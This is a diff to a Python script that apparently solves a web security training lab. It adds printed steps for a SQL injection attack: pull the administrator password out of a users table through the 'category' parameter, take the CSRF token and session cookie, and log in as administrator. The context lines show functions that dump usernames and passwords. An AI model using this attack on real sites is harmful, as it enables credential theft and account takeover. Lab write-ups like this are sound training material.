@@ -2,6 +2,7 @@ import requests
 import urllib3
 from bs4 import BeautifulSoup
 import re
+from colorama import Fore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -33,6 +34,9 @@ def exploit_sqli_users_table(url, proxies=None):
     return False
 
 def run(url, payload=None, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Inject payload into 'category' query parameter to retrieve administrator password from users table using concatenation method\n2. Fetch the login page\n3. Extract the csrf token and session cookie\n4. Login as the administrator\n5. Fetch the administrator profile\n""")
+
     print("[+] Dumping the list of usernames and passwords...")
     if exploit_sqli_users_table(url, proxies=proxies):
         print("[+] Login with above creds!")
